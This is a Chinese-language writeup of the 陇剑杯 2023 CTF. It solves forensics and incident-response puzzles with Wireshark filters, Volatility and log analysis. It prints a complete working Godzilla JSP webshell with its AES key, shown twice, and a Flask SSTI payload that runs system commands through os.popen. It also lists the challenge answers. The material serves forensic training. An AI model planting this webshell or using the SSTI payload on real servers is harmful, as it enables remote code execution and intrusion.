---
title: "陇剑杯2023 writeup"
date: 2023-08-28
tags: ["writeup","ctf","陇剑杯"]
categories: ctf
draft: false
---

# HW 

**HW.zip** 解压得到`hard_web.pcap`文件。

## hard_web_1

题目内容：服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)

```bash
http and http.response.code==200
```

![1](https://static.guyu.pro/2023/08/28/hw1/1.webp)

题目所指的服务器应该是`192.168.162.188`

```bash
tcp.connection.synack and ip.dst==192.168.162.188
```

![2](https://static.guyu.pro/2023/08/28/hw1/2.webp)

发现80端口请求较多

```bash
tcp.connection.synack and ip.dst==192.168.162.188 and  tcp.port not in {80}
```

![3](https://static.guyu.pro/2023/08/28/hw1/3.webp)

所以服务器开放端口应该是80 888 8888 

答案 `80,888,8888`

## hard_web_2

题目内容：服务器中根目录下的flag值是多少？

![1](https://static.guyu.pro/2023/08/28/hw2/1.webp)

![2](https://static.guyu.pro/2023/08/28/hw2/2.webp)

![3](https://static.guyu.pro/2023/08/28/hw2/3.webp)

哥斯拉webshell

```java
<%! String xc="748007e861908c03"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%>
```

跟踪到流20052

![4](https://static.guyu.pro/2023/08/28/hw2/4.webp)



![5](https://static.guyu.pro/2023/08/28/hw2/5.webp)

发现并不是查看flag，继续跟进流20053

![6](https://static.guyu.pro/2023/08/28/hw2/6.webp)




![3](https://static.guyu.pro/2023/08/28/hw2/7.webp)



![3](https://static.guyu.pro/2023/08/28/hw2/8.webp)

解密请求报文应该是查看flag内容了，解密返回报文得到flag

![3](https://static.guyu.pro/2023/08/28/hw2/9.webp)

答案 `flag{9236b29d-5488-41e6-a04b-53b0d8276542}`

## hard_web_3

题目内容：该webshell的连接密码是多少？

```java
<%!
String xc="748007e861908c03"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}
%>
<%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%>

```

![1](https://static.guyu.pro/2023/08/28/hw3/1.webp)

答案 `14mk3y`

# SS

**ss.zip** 解压得到`final.pcap`文件和`do.tar`文件。

## sevrer save_1

题目内容：黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514

![1](https://static.guyu.pro/2023/08/28/ss1/1.webp)

![2](https://static.guyu.pro/2023/08/28/ss1/2.webp)

![3](https://static.guyu.pro/2023/08/28/ss1/3.webp)

![4](https://static.guyu.pro/2023/08/28/ss1/4.webp)

答案 `CVE-2022-22965`

## sevrer save_2

题目内容：黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444

![1](https://static.guyu.pro/2023/08/28/ss2/1.webp)

![2](https://static.guyu.pro/2023/08/28/ss2/2.webp)

答案 `192.168.43.128:2333`

## sevrer save_3

题目内容：黑客的病毒名称是什么？ 格式为：filename

![1](https://static.guyu.pro/2023/08/28/ss3/1.webp)

答案 `main`

## sevrer save_4

题目内容：黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password

![1](https://static.guyu.pro/2023/08/28/ss4/1.webp)

答案 `ll:123456`

## sevrer save_5

题目内容：服务器在被入侵时外网ip是多少? 格式为：10.10.0.1

![1](https://static.guyu.pro/2023/08/28/ss5/1.webp)

答案 `172.105.202.239`

## sevrer save_6

题目内容：病毒运行后释放了什么文件？格式：文件1,文件2

![1](https://static.guyu.pro/2023/08/28/ss6/1.webp)

答案 `lolMiner,mine_doge.sh`

## sevrer save_7

题目内容：矿池地址是什么？ 格式：domain:1234

![1](https://static.guyu.pro/2023/08/28/ss7/1.webp)



答案 `doge.millpools.cc:5567`

## sevrer save_8

题目内容：黑客的钱包地址是多少？格式：xx:xxxxxxxx

![1](https://static.guyu.pro/2023/08/28/ss8/1.webp)

答案 `DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9`

# WS

**ws.zip** 解压得到`1.pcapng`文件。

## Wireshark1_1

题目内容：被入侵主机的IP是？

![1](https://static.guyu.pro/2023/08/28/ws1/1.webp)

![2](https://static.guyu.pro/2023/08/28/ws1/2.webp)

![3](https://static.guyu.pro/2023/08/28/ws1/3.webp)

![4](https://static.guyu.pro/2023/08/28/ws1/4.webp)

答案 `192.168.246.28`

## Wireshark1_2

题目内容：被入侵主机的口令是？

![1](https://static.guyu.pro/2023/08/28/ws2/1.webp)

答案 `youcannevergetthis`

## Wireshark1_3

题目内容：用户目录下第二个文件夹的名称是？

![1](https://static.guyu.pro/2023/08/28/ws3/1.webp)

答案 `Downloads`

## Wireshark1_4

题目内容：/etc/passwd中倒数第二个用户的用户名是？

![1](https://static.guyu.pro/2023/08/28/ws4/1.webp)

答案 `mysql`

# IR

**ir.zip** 解压得到`irTest.ova`文件。
双击导入Virtualbox虚拟机，添加一张网卡，设置成桥接，启动虚拟机。

## IncidentResponse_1

题目内容：你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）

挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

![1](https://static.guyu.pro/2023/08/28/ir1/1.webp)

使用[SSHFS-Win Manager](https://github.com/evsar3/sshfs-win-manager) 添加配置，通过ssh挂载文件系统。

![1](https://static.guyu.pro/2023/08/28/ir1/2.webp)

直接使用杀毒软件

![1](https://static.guyu.pro/2023/08/28/ir1/3.webp)

![1](https://static.guyu.pro/2023/08/28/ir1/4.webp)



答案 `6f72038a870f05cbf923633066e48881`

## IncidentResponse_2

题目内容：挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

![1](https://static.guyu.pro/2023/08/28/ir2/1.webp)

域名是 `donate.v2.xmrig.com`

![2](https://static.guyu.pro/2023/08/28/ir2/2.webp)

答案 `3fca20bb92d0ed67714e68704a0a4503`

## IncidentResponse_3

题目内容：攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

访问web

![1](https://static.guyu.pro/2023/08/28/ir3/1.webp)

![2](https://static.guyu.pro/2023/08/28/ir3/2.webp)

![2](https://static.guyu.pro/2023/08/28/ir3/3.webp)

![4](https://static.guyu.pro/2023/08/28/ir3/4.webp)

存在shiro反序列化漏洞（shiro deserialization），看提示答案带空格要去掉

![5](https://static.guyu.pro/2023/08/28/ir3/5.webp)

答案 `3ee726cb32f87a15d22fe55fa04c4dcd`

## IncidentResponse_4

题目内容：攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

```bash
find / -name 'access.log'
cat /var/log/nginx/access.log |awk '{print $1}'|uniq -c |sort -k1,1nr
```

![1](https://static.guyu.pro/2023/08/28/ir4/1.webp)

攻击者IP应该是`81.70.166.3`

![2](https://static.guyu.pro/2023/08/28/ir4/2.webp)

答案 `c76b4b1a5e8c9e7751af4684c6a8b2c9`

## IncidentResponse_5

题目内容：攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

```bash
 /var/log/nginx/access.log
```

![2](https://static.guyu.pro/2023/08/28/ir5/1.webp)

```bash
grep -r '81.70.166.3'  /var/log/nginx/access.log |awk '{print $12,$13,$14,$15,$16}'|sort -nr|uniq -c|sort -rn
```

![2](https://static.guyu.pro/2023/08/28/ir5/2.webp)

应该是 `"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"`去掉空格，再把大写转小写

![3](https://static.guyu.pro/2023/08/28/ir5/3.webp)

答案 `6ba8458f11f4044cce7a621c085bb3c6`

## IncidentResponse_6

题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

添加ssh免密钥登录`/root/.ssh/authorized_keys`

![1](https://static.guyu.pro/2023/08/28/ir6/1.webp)

答案 `a1fa1b5aeb1f97340032971c342c4258`

## IncidentResponse_7

题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）

```bash
find / -newermt '2023-07-23 16:38:10' ! -newermt '2023-07-23 19:38:10'
```

![1](https://static.guyu.pro/2023/08/28/ir7/1.webp)

答案 `b2c5af8ce08753894540331e5a947d35`

# SSW

**ssw.zip** 解压得到`SmallSword.pcapng`文件。

## SmallSword_1

题目内容：连接蚁剑的正确密码是______________?（答案示例：123asd）

![1](https://static.guyu.pro/2023/08/28/ssw1/1.webp)

![2](https://static.guyu.pro/2023/08/28/ssw1/2.webp)

答案 `6ea280898e404bfabd0ebb702327b19f`

## SmallSword_2

题目内容：攻击者留存的值是______________?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)

```bash
tcp contains "write"
```

![1](https://static.guyu.pro/2023/08/28/ssw2/1.webp) 

就俩数据包，看后面那个24775

![2](https://static.guyu.pro/2023/08/28/ssw2/2.webp)

![3](https://static.guyu.pro/2023/08/28/ssw2/3.webp)

答案 `ad6269b7-3ce2-4ae8-b97f-f259515e7a91 `

## SmallSword_3

题目内容：攻击者下载到的flag是______________?(答案示例：flag3{uuid})

```bash
tcp contains "Program"
```

![1](https://static.guyu.pro/2023/08/28/ssw3/1.webp)

![2](https://static.guyu.pro/2023/08/28/ssw3/2.webp)

![3](https://static.guyu.pro/2023/08/28/ssw3/3.webp)

运行后生成test.jpg



![4](https://static.guyu.pro/2023/08/28/ssw3/4.webp)

![5](https://static.guyu.pro/2023/08/28/ssw3/5.webp)

png图片的长宽存在问题，尝试crc爆破

```python
import os
import binascii
import struct

for i in range(20000):#一般 20000就够
    wide = struct.pack('>i',i)
    for j in range(20000):
        high = struct.pack('>i',j)
        data = b'\x49\x48\x44\x52' + wide+ high+b'\x08\x02\x00\x00\x00'
        #因为是 Py3，byte和str型不能直接进行运算，要写把 str写 b'...'。不然把 wide和 high写成 str(...)

        crc32 = binascii.crc32(data) & 0xffffffff
        if crc32 == 0x5ADB9644:  # 0x889C2F07是这个 png文件头的 CRC校验码，在 21~25byte处
            print('\n\n',i,j,crc32)   #0x 后的数字为十六进制中crc位置的代码（winhex左016，13-下一行的0）
            print(hex(i),hex(j),hex(crc32))
            exit(0)

```

```bash
605 769 1524340292
0x25d 0x301 0x5adb9644
```

![6](https://static.guyu.pro/2023/08/28/ssw3/6.webp)

![7](https://static.guyu.pro/2023/08/28/ssw3/7.webp)

答案 `flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57}`

# EW

**ew.zip** 解压得到`ez_web.pcap`文件。

## ez_web_1

题目内容：服务器自带的后门文件名是什么？（含文件后缀）

http定位webshell文件为`d00r.php`

![1](https://static.guyu.pro/2023/08/28/ew1/1.webp)



![1](https://static.guyu.pro/2023/08/28/ew1/2.webp)

答案 `ViewMore.php`

## ez_web_2

题目内容：服务器的内网IP是多少？

![1](https://static.guyu.pro/2023/08/28/ew2/1.webp)

答案 `192.168.101.132`

## ez_web_3

题目内容：攻击者往服务器中写入的key是什么？

![1](https://static.guyu.pro/2023/08/28/ew3/1.webp)

找到写入文件数据流

![1](https://static.guyu.pro/2023/08/28/ew3/2.webp)

对应密码7e03864b0db7e6f9

写入文件先url decode 再base64 decode，得到一个zip压缩文件

![3](https://static.guyu.pro/2023/08/28/ew3/3.webp)

使用刚才得到的密码解密，打开txt看到flag

![4](https://static.guyu.pro/2023/08/28/ew3/4.webp)

答案 `7d9ddff2-2d67-4eba-9e48-b91c26c42337`

# BF

**bf.zip** 解压得到`baby_forensics.raw`文件和`baby_forensics.vmdk`文件。

## baby_forensics_1

题目内容：磁盘中的key是多少？

先查找带key的文件

```bash
.\volatility_2.6_win64_standalone.exe -f .\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw  --profile=Win7SP1x64   filescan key*|findstr key
0x000000003df80070      2      0 -W-rwd \Device\HarddiskVolume2\Users\admin\AppData\Local\Temp\vmware-admin\VMwareDnD\abafa01a\key.txt
0x000000003df94070     16      0 RW---- \Device\HarddiskVolume3\key.txt
0x000000003e332e60      1      1 ------ \Device\NamedPipe\keysvc
0x000000003e3345b0      1      1 ------ \Device\NamedPipe\keysvc
0x000000003e7dca60      2      1 ------ \Device\NamedPipe\keysvc
```

导出文件

```bash
.\volatility_2.6_win64_standalone.exe -f .\lj2023\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw  --profile=Win7SP1x64   dumpfiles  --dump-dir . -Q 0x000000003df80070
```

![1](https://static.guyu.pro/2023/08/28/bf1/1.webp)

![2](https://static.guyu.pro/2023/08/28/bf1/2.webp)

![3](https://static.guyu.pro/2023/08/28/bf1/3.webp)

答案 `thekeyis2e80307085fd2b5c49c968c323ee25d5`

## baby_forensics_2

题目内容：电脑中正在运行的计算器的运行结果是多少？

```bash
.\volatility_2.6_win64_standalone.exe -f .\lj2023\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw  --profile=Win7SP1x64   windows >dump
```

![1](https://static.guyu.pro/2023/08/28/bf2/1.webp)

打开dump文件搜索calc.exe并结合`Name\: [0-9]` 

答案 `7598632541`

## baby_forensics_3

题目内容：该内存文件中存在的flag值是多少？



```bash
.\volatility_2.6_win64_standalone.exe -f .\lj2023\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw  --profile=Win7SP1x64   filescan |findstr '.snt'
```

![1](https://static.guyu.pro/2023/08/28/bf3/1.webp)

```bash
.\volatility_2.6_win64_standalone.exe -f .\lj2023\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw  --profile=Win7SP1x64   dumpfiles -n --dump-dir . -Q 0x000000003dfc3d10
```

得到StickyNotes.snt 拖到windows7操作系统，替换掉指定目录的`C:\Users\admin\AppData\Roaming\Microsoft\Sticky Notes\StickyNotes.snt`文件

![2](https://static.guyu.pro/2023/08/28/bf3/2.webp)

或者使用R-studio直接获取

![3](https://static.guyu.pro/2023/08/28/bf3/3.webp)

得到字符串`U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==`

继续查找，找到疑似密钥 `qwerasdf`

![4](https://static.guyu.pro/2023/08/28/bf3/4.webp)

使用cryptojs在线aes解密

![5](https://static.guyu.pro/2023/08/28/bf3/5.webp)

答案 `flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}`

# TP

**tp.zip** 解压得到`stream_new.cap`文件。

## tcpdump_1

题目内容：攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin

```bash
tcp contains "login" 
```

![1](https://static.guyu.pro/2023/08/28/tp1/1.webp)

```bash
tcp contains "\"errCode\":200" 
```

![2](https://static.guyu.pro/2023/08/28/tp1/2.webp)

一行一行看，第三行找到登录成功记录。

![3](https://static.guyu.pro/2023/08/28/tp1/3.webp)

答案 `TMjpxFGQwD:123457`

## tcpdump_2

题目内容：攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）

```bash
tcp contains "userid=1" 
tcp contains "userid=2" 
```

看数据包编号，应该是先登录了userid=2，越权登录userid=1，攻击者应该是userid=1

![1](https://static.guyu.pro/2023/08/28/tp2/1.webp)

答案 `accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1`

## tcpdump_3

题目内容：攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456

```bash
tcp contains "password"  and tcp contains "username"
```

![1](https://static.guyu.pro/2023/08/28/tp3/1.webp)

![2](https://static.guyu.pro/2023/08/28/tp3/2.webp)

答案 `zyplayer:1234567`

## tcpdump_4

题目内容：攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so

 ![2](https://static.guyu.pro/2023/08/28/tp4/1.webp)

![2](https://static.guyu.pro/2023/08/28/tp4/2.webp)

答案 `CVE-2022-21724:custom.dtd.xml`

## tcpdump_5

题目内容：给出攻击者获取系统权限后，下载的工具的名称，比如nmap

 从数据流1602开始跟下去，直到1611才看到下载文件

![1](https://static.guyu.pro/2023/08/28/tp5/1.webp)

答案 `fscan`

# HD

**hd.zip** 解压得到`Flask.pcap`文件。

## hacked_1

题目内容：admIn用户的密码是什么？

```js
  crypt_key = 'l36DoqKUYQP0N7e1';
  crypt_iv = '131b0c8a7a6e072e';
```

![1](https://static.guyu.pro/2023/08/28/hd1/1.webp)

![2](https://static.guyu.pro/2023/08/28/hd1/2.webp)

![3](https://static.guyu.pro/2023/08/28/hd1/3.webp)

![4](https://static.guyu.pro/2023/08/28/hd1/4.webp)

查找数据流

![5](https://static.guyu.pro/2023/08/28/hd1/5.webp)

![6](https://static.guyu.pro/2023/08/28/hd1/6.webp)

![7](https://static.guyu.pro/2023/08/28/hd1/7.webp)



答案 `flag{WelC0m5_TO_H3re}`

## hacked_2

题目内容：app.config['SECRET_KEY']值为多少？

![1](https://static.guyu.pro/2023/08/28/hd2/1.webp)

![2](https://static.guyu.pro/2023/08/28/hd2/2.webp)

![3](https://static.guyu.pro/2023/08/28/hd2/3.webp)

答案 `ssti_flask_hsfvaldb`

## hacked_3

题目内容：flask网站由哪个用户启动？

寻找返回http数据包中包含Set-Cookie

```bash
tcp contains "Set-Cookie" and http.response.code==200
```

![1](https://static.guyu.pro/2023/08/28/hd3/1.webp)

![2](https://static.guyu.pro/2023/08/28/hd3/2.webp)

![3](https://static.guyu.pro/2023/08/28/hd3/3.webp)

```python
python .\flask_session_cookie_manager3.py  decode -c ".eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4"

b'{"flag":"red\\n","username":"{%if session.update({\'flag\':lipsum[\'__globals__\'][\'__getitem__\'](\'os\')[\'popen\'](\'whoami\').read()})%}{%endif%}"}'
```

答案 `red`

## hacked_4

题目内容：攻击者写入的内存马的路由名叫什么？（答案里不需要加/）

![1](https://static.guyu.pro/2023/08/28/hd4/1.webp)

![2](https://static.guyu.pro/2023/08/28/hd4/2.webp)

答案 `Index`



整理复现来自gu.y
